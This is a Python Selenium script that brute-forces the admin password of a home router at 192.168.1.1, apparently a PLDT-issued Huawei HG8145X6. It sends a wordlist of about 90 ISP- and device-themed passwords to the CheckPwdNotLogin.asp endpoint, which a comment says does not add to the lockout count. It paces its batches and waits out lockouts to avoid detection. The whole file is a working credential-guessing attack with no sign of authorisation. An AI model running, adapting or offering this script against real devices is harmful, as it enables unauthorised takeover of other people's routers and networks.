#!/usr/bin/env python3
"""Efficient brute-force: use Selenium's CheckPassword which calls CheckPwdNotLogin.asp.
Test in batches of 3 (lockout threshold), then wait for expiry."""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os, time

ROUTER = "https://192.168.1.1"

def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    opts.add_argument("--incognito")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(15)
    return driver

# CheckPwdNotLogin.asp brute-force (no lockout increment)
# But the endpoint IS affected by existing lockout from login.cgi failures
# Strategy: use CheckPwdNotLogin.asp directly via AJAX from a Selenium page
# If it returns empty, wait and retry

passwords = [
    "Admin1234", "PLDT1234", "PLDTHOME", "PLDTHM12", "PLDT@1234",
    "password", "12345678", "admin123", "admin1234", "Admin@123",
    "PLDT2024", "Admin2024", "HUAWEI12", "HWAdmin1", "adminpldt",
    "PLDTHOME1", "FIBR1234", "fibr1234", "FIBER1234", "PLDTH@1234",
    "Admin@1234", "P@ssw0rd", "Passw0rd", "P@ss1234", "Pass@1234",
    "PLDTH@123", "PLDT123", "Fibr@1234", "Fibr1234", "WIFI1234",
    "PLDTH0M3", "PLDTHom3", "PLDThome", "Admin!123", "admin!123",
    "Aa123456", "Abcd1234", "Qwerty12", "Huawei12", "hg8145x6",
    "Tel$ec01", "Admin@#12", "admin@#12", "P@ssw0rd1", "Admin@123!",
    "Admin123!", "admin123!", "PLDT@123!", "PLDTH!123", "PLDT123!",
    "FIBR@123", "fibr@123", "Admin#123", "admin#123", "PLDT#123",
    "PLDTH#123", "WIFI@1234", "fiber@123", "Fiber1234", "Admin@12345",
    "admin@12345", "PLDT@12345", "PLDTHOME@12", "admin12345", "Admin12345",
    "HG8145X6", "Huawei@123", "HUAWEI@123", "PLDTfibr12", "PLDTHOMEfibr",
    "Adminfibr1", "adminfibr1", "PLDTfibr", "adminfibr", "Adminfibr",
    "PLDTHome12", "pldthome12", "PLDTHome123", "pldthome123",
    "admin123456", "Admin123456", "PLDT123456", "password12", "password123",
    "P@ssword12", "P@ssword123", "Welcome12", "welcome12", "qwerty1234",
    "Admin@1234!", "admin@1234!", "PLDT@1234!", "PLDTH@1234!",
]

driver = setup_driver()
try:
    # Navigate to admin.html (has CheckPassword function)
    print("1. Loading admin.html...")
    driver.get(ROUTER + "/admin.html")
    time.sleep(5)

    # Check current lockout state
    driver.execute_script("window.preflag = 1;")
    driver.execute_script("document.getElementById('txt_Username').value = 'admin';")
    r = driver.execute_script("""
        var r = null;
        $.ajax({type:'POST', async:false, cache:false, url:'/asp/CheckPwdNotLogin.asp',
            data: 'UserNameInfo=admin&NormalPwdInfo=test123',
            success: function(d) { r = String(d); },
            error: function(xhr) { r = 'err:' + xhr.status; }
        });
        return r;
    """)
    print("   Initial CheckPwdNotLogin test:", repr(r))

    # If empty, we're locked out - need to wait
    if r == "" or r == "[]":
        print("   Locked out. Waiting 2 minutes...")
        time.sleep(120)
        r = driver.execute_script("""
            var r = null;
            $.ajax({type:'POST', async:false, cache:false, url:'/asp/CheckPwdNotLogin.asp',
                data: 'UserNameInfo=admin&NormalPwdInfo=test123',
                success: function(d) { r = String(d); },
                error: function(xhr) { r = 'err:' + xhr.status; }
            });
            return r;
        """)
        print("   After wait:", repr(r))

    # Now brute-force using CheckPwdNotLogin.asp
    print("\n2. Brute-forcing admin password via CheckPwdNotLogin.asp...")
    print("   Testing", len(passwords), "passwords...")

    batch = 0
    i = 0
    while i < len(passwords):
        pwd = passwords[i]

        # Test the password
        r = driver.execute_script("""
            var r = null;
            $.ajax({type:'POST', async:false, cache:false, url:'/asp/CheckPwdNotLogin.asp',
                data: 'UserNameInfo=admin&NormalPwdInfo=' + encodeURIComponent(arguments[0]),
                success: function(d) { r = String(d); },
                error: function(xhr) { r = 'err:' + xhr.status; }
            });
            return r;
        """, pwd)

        if r == "" or r == "[]":
            # Locked out
            print("   [" + str(i) + "] admin:" + pwd + " -> LOCKED (empty)")
            batch += 1
            if batch >= 2:
                print("   Too many lockouts, waiting 2 minutes...")
                time.sleep(120)
                batch = 0
            i += 1
            continue
        elif "err:" in str(r):
            print("   [" + str(i) + "] admin:" + pwd + " -> ERROR: " + str(r))
            i += 1
            continue
        else:
            result = r.strip()
            if result == "0" or result == "[]":
                print("   [" + str(i) + "] admin:" + pwd + " -> WRONG (0)")
                batch = 0  # reset batch on successful response
            elif result == "1":
                print("\n   *** FOUND admin PASSWORD: " + pwd + " ***")
                break
            elif result == "2":
                print("\n   *** " + pwd + " is a superadmin account ***")
            else:
                print("   [" + str(i) + "] admin:" + pwd + " -> " + repr(result))
            i += 1

        # Small delay to be gentle
        time.sleep(0.5)

    print("\nDone. Tested", i, "passwords.")

finally:
    driver.quit()
